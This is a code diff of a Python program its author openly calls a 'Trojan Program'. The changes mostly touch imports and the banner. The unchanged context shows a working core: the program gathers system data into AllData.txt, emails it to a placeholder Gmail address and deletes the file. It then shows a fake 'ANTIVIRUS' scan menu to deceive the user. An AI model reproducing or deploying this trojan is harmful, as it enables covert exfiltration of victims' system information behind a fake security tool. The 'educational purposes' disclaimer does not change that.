@@ -1,7 +1,7 @@
 """
 Author: @new92
 Trojan Program
-Made for educational purposes
+Made for educational purposes 
 The author has no responsibility for any illegal activity/activities carried out using this program
           d8888                   888      d8b
          d88888                   888      Y8P
@@ -15,15 +15,15 @@ The author has no responsibility for any illegal activity/activities carried out
 
 #Imports
 try:
+    import time
+    import platform
+    from os import system
     import sys
     import os
     import socket
     import nmap
-    import locale 
-    import platform
-    import time
+    import locale
     import random
-    import pyfiglet
     import geocoder
     import requests
     import http
@@ -43,8 +43,9 @@ try:
     import logging
     import re
     import uuid
+    import art
     import device_detector
-    from os import system
+    from art import tprint
     from device_detector import DeviceDetector
     from device_detector import SoftwareDetector
     from geopy.geocoders import Nominatim
@@ -57,9 +58,8 @@ except ImportError as imp:
         system("pip3 install -r requirements.txt")
     else:
         system("sudo pip3 install -r requirements.txt")
-#End of Imports
 
-#Main program
+#Information Gathering + Writing to txt file & Sending Them
 def get_size(bytes, suffix="B"):
     factor = 1024
     for unit in ["", "K", "M", "G", "T", "P"]:
@@ -109,10 +109,14 @@ message = gmail.Message("Data",to="enteryouremailhere@gmail.com",attachments=["A
 gmail1.send(message)
 time.sleep(2)
 os.remove("AllData.txt")
+
 num=random.randint(1,24)
-antivirus=pyfiglet.figlet_format("ANTIVIRUS")
-print(antivirus)
+
+#Logo
+tprint("ANTIVIRUS",font="tarty1")
+
 time.sleep(2)
+print("\n")
 print("[1] : Quick System Scan")
 time.sleep(1)
 print("[2] : Full System Scan")
@@ -123,11 +127,11 @@ print("[4] : Scan for vulnerabilities")
 time.sleep(1)
 print("[5] : Database Update")
 time.sleep(1)
-action=int(input("[+] Please enter the action you want to make: "))
-while action < 1 or action > 5:
+action=int(input("[::] Please enter the action you want to make: "))
+while action == None or action < 1 or action > 5:
     print("[!] Invalid Action !")
     time.sleep(2)
-    action=int(input("[+] Please enter again: "))
+    action=int(input("[::] Please enter again: "))
 if action == 1:
     print("[+] Initiating Quick System Scan...")
     time.sleep(2)
